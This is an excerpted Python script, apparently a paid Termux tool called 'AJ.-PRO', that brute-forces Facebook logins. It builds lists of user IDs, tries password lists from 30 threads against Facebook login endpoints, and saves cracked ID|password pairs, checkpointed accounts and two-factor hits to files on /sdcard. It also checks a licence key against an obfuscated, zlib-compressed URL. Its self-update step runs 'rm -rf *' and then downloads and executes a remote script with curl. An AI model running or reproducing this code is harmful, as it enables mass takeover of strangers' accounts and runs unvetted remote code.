...
try:
        ...
        os.system('python AJ..py')
except:pass
myid=uuid.uuid4().hex[:5].upper()
try:
        key1 = open('/data/data/com.termux/files/usr/bin/.mrAJ.xxx-cov', 'r').read()
except:
        kok=open('/data/data/com.termux/files/usr/bin/.mrAJ.xxx-cov', 'w');kok.write(myid);kok.close()
uid = os.getuid()
key1 = open('/data/data/com.termux/files/usr/bin/.mrAJ.xxx-cov', 'r').read()
kex=(f"AJ.-XD{uid}TS{key1}PX110E==")
...
def chk():
        ...
        if ua not in urll:
                ...
                if kex in requests.get(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7O,((\xabH\xd1K\xca\xc9O/.\xc8/\xd1K\xce\xcf\xd57202\xd274\xd4\x07\x8ag\x94\xe4\xe6\x00\x00U\xba\x0e\xd8')).text:
                        print(' Wair for AJ. New update ');exit()
                else:
...
try:
        ...
        if updt in linx:
                ...
                print('\n AJ.-PRO Update Done Wait for installing...\n')
                os.system('cd $HOME && cd AJ.-PRO')
                os.system('rm -rf *')
                os.system("curl -L https://raw.githubusercontent.com/AJ.110/AJ.-PRO/main/AJ..py -o AJ..py && python AJ..py")
        ...
        try:
                ...
                if kex in link:
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/AJ._VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                        ...
                        linex()
                        tks = ("Hi AJ. Sir, I Need To Buy Your Paid AJ. PRO Tools Version 1.9.7 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python AJ..py')
                        linex()
                        exit()
        except ValueError:
                exit()
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as AJ.:     
                        clear()
                        tl = str(len(user))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [AJ.-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        AJ.=session.cookies.get_dict().keys()
                        if "c_user" in AJ.:
                                print('\r\r\033[1;32m [AJ.-OK] %s | %s'%(ids,pas))
                                open('/sdcard/AJ.-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in AJ.:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [AJ.-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/AJ.-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [AJ.-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/AJ.-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[AJ.-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [AJ.-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/AJ.-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [AJ.-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/AJ.-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
